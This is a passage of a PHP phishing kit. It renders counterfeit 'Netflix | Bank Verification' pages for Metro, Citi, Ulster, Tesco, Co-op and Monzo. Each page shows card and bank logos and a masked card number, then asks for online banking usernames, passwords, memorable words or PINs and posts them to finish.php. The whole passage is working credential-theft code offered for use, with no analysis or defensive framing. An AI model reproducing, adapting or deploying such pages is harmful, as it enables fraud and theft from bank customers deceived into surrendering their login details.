                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=metro">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Username:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="memWord" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'citi'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/citi.png" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=citi">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Username:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'ulster'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/ulster2.png" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=ulster">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Username:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Security Pin:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'tesco'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/tesco.jpg" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=tesco">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Username:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Security Pin:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'coop'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/coop2.jpg" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=coop">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Customer Number:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Pin:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'monzo'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/monzo.png" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=monzo">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Customer Number:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Name:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="memWord" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
?>